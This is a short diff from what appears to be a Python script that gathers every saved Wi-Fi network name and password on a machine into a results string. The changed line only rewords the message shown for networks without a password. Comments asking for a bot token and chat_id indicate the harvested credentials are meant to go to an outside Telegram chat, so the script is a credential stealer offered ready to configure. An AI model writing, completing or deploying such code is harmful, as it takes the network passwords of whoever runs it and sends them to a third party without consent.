@@ -12,7 +12,7 @@ for name in profiles:
         data= f'WI-Fi name: {name} =AND=> Password: {key[0]}\n'
         results = f'{results}{data}'
     except IndexError:
-        data= f'WI-Fi name: {name} AND Password: be passworda balasha\n'
+        data= f'WI-Fi name: {name} AND Password: this wifi is unlock \n'
         results = f'{results}{data}'
 
                                             #insert your token bot        #insert chat_id
